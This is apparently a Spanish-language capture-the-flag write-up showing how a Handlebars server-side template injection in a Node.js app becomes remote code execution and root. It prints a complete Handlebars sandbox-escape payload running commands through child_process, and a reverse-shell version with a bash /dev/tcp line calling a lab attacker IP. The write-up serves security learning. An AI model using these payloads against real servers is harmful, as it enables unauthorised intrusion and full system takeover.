
# Server-Side Template Injection

## Attack Chain

```text
SSTI
Sandbox Escape
JavaScript Execution
Node.js
child_process
RCE
Reverse Shell
root
```

# 1. Que es esta vulnerabilidad?

La vulnerabilidad principal encontrada en esta maquina es una Server-Side Template Injection (SSTI).

SSTI ocurre cuando una aplicacion utiliza un motor de plantillas para generar contenido dinamico y permite que informacion controlada por el usuario sea interpretada como codigo de plantilla.

En esta maquina, el servidor utiliza Handlebars.js para renderizar las plantillas.

El problema aparece cuando el input proporcionado por el usuario se procesa directamente mediante el motor de plantillas sin una sanitizacion adecuada.

En lugar de interpretar nuestro input como texto:

```text
{{7*7}}
```

el servidor puede terminar interpretandolo como una expresion del motor de plantillas.

Esto puede permitir ejecutar operaciones dentro del contexto de Handlebars y, dependiendo de la version y configuracion, intentar escapar de las restricciones del motor.

# 2. Confirmando SSTI

Para comprobar si el servidor estaba interpretando nuestro input como una plantilla, podemos utilizar una operacion matematica sencilla:

```text
{{7*7}}
```

Si la aplicacion devuelve:

```text
49
```

podemos confirmar que nuestro input esta siendo evaluado por el motor de plantillas.

La razon es que si la aplicacion simplemente tratara:

```text
{{7*7}}
```

como texto, esperariamos recibir exactamente ese contenido.

Sin embargo, si obtenemos:

```text
49
```

significa que el servidor proceso la expresion.

Otra pista que puede ayudar a identificar el entorno es observar los errores generados por la aplicacion.

Por ejemplo, errores que hagan referencia a Node.js o a funcionalidades relacionadas con Handlebars pueden proporcionar informacion sobre la tecnologia utilizada por el servidor.

En este punto tenemos confirmada la SSTI y podemos comenzar a investigar como convertirla en ejecucion de codigo.

# 3. Sandbox Escape mediante Function

Handlebars incorpora mecanismos de seguridad destinados a restringir determinadas operaciones dentro de las plantillas.

Sin embargo, en versiones y configuraciones vulnerables, es posible escapar de estas restricciones aprovechando caracteristicas propias de JavaScript.

Una de las piezas fundamentales de esta tecnica son los constructores de JavaScript.

Conceptualmente podemos encontrar una relacion como:

```javascript
"string".sub.constructor === Function
```

Esto es importante porque el constructor Function permite crear una funcion a partir de codigo JavaScript.

Por ejemplo:

```javascript
Function("return 7 * 7")()
```

ejecutaria JavaScript dinamicamente.

Por lo tanto, si desde Handlebars conseguimos acceder al constructor Function, podemos pasar de ejecutar expresiones limitadas del motor de plantillas a ejecutar JavaScript arbitrario.

Este proceso es lo que permite realizar el sandbox escape.

# 4. RCE mediante child_process

Una vez que tenemos capacidad para ejecutar JavaScript en el contexto del servidor, el siguiente objetivo es conseguir ejecucion de comandos del sistema operativo.

Al estar trabajando sobre Node.js, tenemos acceso potencial a modulos nativos del runtime.

Uno de los mas importantes para este proposito es:

```text
child_process
```

El modulo child_process proporciona funcionalidades para crear procesos y ejecutar comandos del sistema.

Podemos utilizar:

```javascript
require('child_process').execSync('whoami').toString()
```

La ejecucion funciona de la siguiente manera:

```text
JavaScript
Function
child_process
execSync
whoami
Output
```

Si el resultado es, por ejemplo:

```text
node
```

o el usuario bajo el cual esta ejecutandose la aplicacion, sabemos que hemos conseguido ejecutar comandos en el sistema operativo.

En este punto la SSTI se ha convertido en Remote Code Execution (RCE).

# 5. exec vs execSync

Una diferencia importante al trabajar con child_process es la forma en que funcionan exec y execSync.

## exec

```javascript
require('child_process').exec('whoami')
```

exec es asincrono.

Inicia el proceso y no espera de forma sincrona a que termine. El resultado normalmente se obtiene posteriormente mediante un callback.

## execSync

```javascript
require('child_process').execSync('whoami').toString()
```

execSync es sincrono.

Espera a que el comando termine y devuelve directamente su resultado.

Esto resulta especialmente conveniente para una SSTI cuando queremos que el resultado del comando aparezca en la respuesta HTTP.

Por ejemplo:

```javascript
require('child_process')
    .execSync('whoami')
    .toString()
```

permite ejecutar whoami y devolver su resultado.

Por eso execSync es muy util para comprobar RCE con comandos como:

```text
whoami
id
pwd
uname -a
```

Para una reverse shell no necesitamos recuperar el resultado del comando. Nuestro objetivo es iniciar la conexion inversa, por lo que podemos utilizar exec.

# 6. Reverse Shell

Una vez confirmada la ejecucion de comandos, podemos intentar obtener una reverse shell.

Un problema al enviar directamente ciertos comandos mediante HTTP es que caracteres como:

```text
>
&
```

pueden interferir con el procesamiento de la peticion.

Una forma de evitar este problema es utilizar Base64 para codificar el comando.

Primero generamos el comando desde nuestra maquina atacante:

```bash
echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' | base64
```

Esto nos devuelve una cadena Base64.

Despues iniciamos un listener:

```bash
nc -lvnp 4444
```

Finalmente, desde el contexto de Node.js podemos ejecutar:

```text
exec('echo BASE64== | base64 -d | bash')
```

El proceso consiste en enviar la cadena Base64 al servidor, decodificarla y ejecutarla mediante bash.

Para esta parte utilizamos exec en lugar de execSync porque no necesitamos que el comando devuelva su resultado al servidor. El objetivo es simplemente iniciar la conexion inversa.

# 7. Payload para RCE

Una vez identificado el metodo para escapar del sandbox, podemos utilizar el siguiente payload de Handlebars para ejecutar comandos sin necesidad de establecer inicialmente una reverse shell:

```text
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('COMANDO').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

La parte especialmente importante del payload es:

```javascript
process.mainModule.require('child_process')
```

que permite acceder al modulo child_process.

Posteriormente:

```javascript
.execSync('COMANDO').toString()
```

ejecuta el comando y transforma el resultado en un string que puede ser mostrado por la plantilla.

Por ejemplo, podemos sustituir:

```text
COMANDO
```

por:

```text
whoami
```

para comprobar con que usuario se esta ejecutando el proceso.

# 8. Payload para Reverse Shell

Para obtener una reverse shell podemos modificar la parte encargada de ejecutar el comando.

En lugar de:

```javascript
execSync()
```

utilizamos:

```javascript
exec()
```

y ejecutamos el comando que inicia nuestra reverse shell.

El payload utilizado es:

```text
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').exec('bash -i >& /dev/tcp/10.10.14.141/4444 0>&1');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Este payload debe ser correctamente codificado para poder enviarlo mediante HTTP.

En particular, Burp Suite puede utilizarse para realizar el URL encoding necesario antes de enviar la peticion.

# 9. Obtencion de la Reverse Shell

Con nuestro listener preparado:

```bash
nc -lvnp 4444
```

enviamos el payload al servidor.

El servidor procesa el template y ejecuta el codigo JavaScript que accede a child_process.

Posteriormente exec ejecuta el comando encargado de iniciar la reverse shell.

Finalmente obtenemos una conexion inversa en nuestra maquina atacante.

En este punto pasamos de tener solamente ejecucion de comandos individuales a disponer de una shell interactiva sobre el sistema.

# 10. Attack Path

La cadena completa de explotacion puede resumirse de la siguiente manera:

```text
User controlled input
Handlebars.js
SSTI
Sandbox Escape
Function Constructor
Arbitrary JavaScript Execution
Node.js
child_process
exec / execSync
RCE
Base64 encoded reverse shell
Shell access
Privilege Escalation
root
```

# 11. Vulnerabilities & Techniques

Las principales vulnerabilidades y tecnicas utilizadas durante la explotacion fueron:

* Server-Side Template Injection (SSTI)
* Handlebars Template Injection
* Handlebars Sandbox Escape
* JavaScript Function Constructor Abuse
* Node.js child_process Abuse
* Remote Code Execution (RCE)
* Command Execution
* Reverse Shell
* Base64 Command Encoding
* Privilege Escalation

La vulnerabilidad inicial fue la SSTI. Esta permitio posteriormente escapar de las restricciones del motor de plantillas, ejecutar JavaScript arbitrario y acceder a funcionalidades de Node.js.

Finalmente, child_process permitio convertir la ejecucion de JavaScript en ejecucion de comandos del sistema operativo.

# 12. Lessons Learned

Esta maquina demuestra por que una SSTI puede ser extremadamente peligrosa dependiendo del motor de plantillas y del entorno donde se ejecuta.

La prueba inicial:

```text
{{7*7}}
```

permite identificar que nuestro input esta siendo interpretado por el motor de plantillas.

A partir de ahi, el objetivo es comprender que capacidades ofrece el motor y si es posible escapar de sus restricciones.

En este caso, el acceso al constructor Function permitio pasar de las capacidades normales de Handlebars a JavaScript arbitrario.

Posteriormente, el modulo:

```text
child_process
```

permitio ejecutar comandos del sistema operativo.

Por ultimo, una reverse shell permitio obtener una sesion interactiva y continuar con la enumeracion y escalada de privilegios.

El concepto mas importante que me llevo de esta maquina es que encontrar una SSTI no significa solamente que podemos ejecutar expresiones.

Debemos investigar hasta donde podemos llegar desde el contexto del template engine.

En este caso, la vulnerabilidad permitio pasar de una SSTI a RCE y posteriormente a root.

Pwnef :)) !!!

```text
PWNED!!!
```
